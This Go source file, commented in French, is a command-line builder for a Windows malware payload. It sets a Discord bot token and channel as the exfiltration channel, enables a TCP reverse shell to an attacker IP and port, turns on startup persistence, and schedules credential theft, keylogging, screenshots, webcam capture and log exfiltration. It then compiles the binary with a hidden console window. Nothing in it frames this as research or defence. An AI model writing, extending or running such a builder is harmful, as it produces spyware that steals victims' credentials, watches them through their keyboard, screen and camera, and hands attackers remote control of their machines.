/*
builder — générateur en ligne de commande du payload.

Lit payload.example.json (vierge), applique les options de la ligne de
commande, écrit payload.json (gitignoré, jamais commité) puis lance :

	go build -ldflags "-H windowsgui -s -w" -o <sortie> .

Exemples :

	go run ./cmd/builder -bot-token "MTUx…" -guild 1554… -channel 1559… -out app.exe
	go run ./cmd/builder -bot-token "MTUx…" -guild 1554… -channel 1559… \
		-shell -shell-host 203.0.113.7 -shell-port 4444 -steal 60 -persist=false

Les drapeaux omis gardent la valeur de payload.example.json.
*/
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// findRoot remonte jusqu'au dossier contenant go.mod : le builder marche
// depuis n'importe quel sous-dossier du dépôt.
func findRoot(start string) (string, error) {
	dir, err := filepath.Abs(start)
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", fmt.Errorf("go.mod introuvable au-dessus de %s", start)
		}
		dir = parent
	}
}

func main() {
	var (
		src       = flag.String("src", "", "dossier source (défaut : recherche de go.mod depuis le répertoire courant)")
		out       = flag.String("out", "payload.exe", "chemin de l'exécutable produit")
		ldflags   = flag.String("ldflags", "-H windowsgui -s -w", "ldflags du build (-H windowsgui = sans console)")
		botToken  = flag.String("bot-token", "", "jeton du bot Discord")
		guild     = flag.String("guild", "", "ID du serveur Discord (guild_id)")
		channel   = flag.String("channel", "", "ID du salon de repli (channel_id)")
		webhook   = flag.String("webhook", "", "URL de webhook Discord (transport classique, optionnel)")
		enabled   = flag.Bool("enabled", true, "payload actif au démarrage")
		persistOn = flag.Bool("persist", true, "persistance démarrage Windows")
		debug     = flag.Bool("debug", false, "debug (-diag)")
		shell     = flag.Bool("shell", false, "activer le reverse shell TCP")
		shellHost = flag.String("shell-host", "", "IP/publique du reverse shell")
		shellPort = flag.Int("shell-port", 4444, "port du reverse shell")
		stealMin  = flag.Int("steal", -1, "cadence extraction, minutes (-1 = exemple)")
		keylogMin = flag.Int("keylog", -1, "cadence vidage clavier, minutes (-1 = exemple)")
		shotMin   = flag.Int("screenshot", -1, "cadence captures, minutes (-1 = exemple)")
		webcamMin = flag.Int("webcam", -1, "cadence webcam, minutes (-1 = exemple)")
		exfilMin  = flag.Int("exfil", -1, "cadence envoi journaux, minutes (-1 = exemple)")
	)
	flag.Parse()

	root := *src
	if root == "" {
		var err error
		if root, err = findRoot("."); err != nil {
			fmt.Fprintln(os.Stderr, "builder:", err)
			os.Exit(1)
		}
	}

	// --- configuration ------------------------------------------------
	raw, err := os.ReadFile(filepath.Join(root, "payload.example.json"))
	if err != nil {
		fmt.Fprintln(os.Stderr, "builder: payload.example.json introuvable :", err)
		os.Exit(1)
	}
	cfg := map[string]any{}
	if err := json.Unmarshal(raw, &cfg); err != nil {
		fmt.Fprintln(os.Stderr, "builder: modèle JSON invalide :", err)
		os.Exit(1)
	}

	// Le JWT Discord contient des points : sans lui, aucun envoi de bot.
	if *botToken == "" || *guild == "" || *channel == "" {
		fmt.Fprintln(os.Stderr, "builder: -bot-token, -guild et -channel sont obligatoires.")
		fmt.Fprintln(os.Stderr, "builder: (jeton = ID du bot encodé en base64, c'est le champ « Application ID » adapté, visible aussi dans l'URL de l'invite du bot).")
		os.Exit(2)
	}
	cfg["bot_token"] = *botToken
	cfg["guild_id"] = *guild
	cfg["channel_id"] = *channel
	if *webhook != "" {
		cfg["webhook_url"] = *webhook
	}
	cfg["enabled"] = *enabled
	cfg["persist"] = *persistOn
	cfg["debug"] = *debug
	cfg["shell_enable"] = *shell
	if *shellHost != "" {
		cfg["shell_host"] = *shellHost
	}
	cfg["shell_port"] = *shellPort
	for key, v := range map[string]int{
		"interval_steal_min":      *stealMin,
		"interval_keylog_min":     *keylogMin,
		"interval_screenshot_min": *shotMin,
		"interval_webcam_min":     *webcamMin,
		"interval_exfil_min":      *exfilMin,
	} {
		if v >= 0 {
			cfg[key] = v
		}
	}

	pretty, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		fmt.Fprintln(os.Stderr, "builder:", err)
		os.Exit(1)
	}
	if err := os.WriteFile(filepath.Join(root, "payload.json"), append(pretty, '\n'), 0600); err != nil {
		fmt.Fprintln(os.Stderr, "builder: écriture de payload.json impossible :", err)
		os.Exit(1)
	}

	// --- build --------------------------------------------------------
	outAbs, err := filepath.Abs(*out)
	if err != nil {
		fmt.Fprintln(os.Stderr, "builder:", err)
		os.Exit(1)
	}
	build := exec.Command("go", "build", "-ldflags", *ldflags, "-o", outAbs, ".")
	build.Dir = root
	build.Stdout = os.Stdout
	build.Stderr = os.Stderr
	fmt.Println("builder: payload.json écrit, compilation…")
	if err := build.Run(); err != nil {
		fmt.Fprintln(os.Stderr, "builder: échec du build :", err)
		os.Exit(1)
	}

	tokenShort := (*botToken)
	if len(tokenShort) > 9 {
		tokenShort = tokenShort[:6] + "…" + tokenShort[len(tokenShort)-4:]
	}
	fmt.Printf("builder: OK → %s\n", outAbs)
	fmt.Printf("builder: serveur %s, salon %s, jeton %s, persistance=%v, shell=%v, vol=%dmin\n",
		*guild, *channel, tokenShort, *persistOn, *shell, max0(*stealMin))
}

func max0(v int) int {
	if v < 0 {
		return 2880
	}
	return v
}
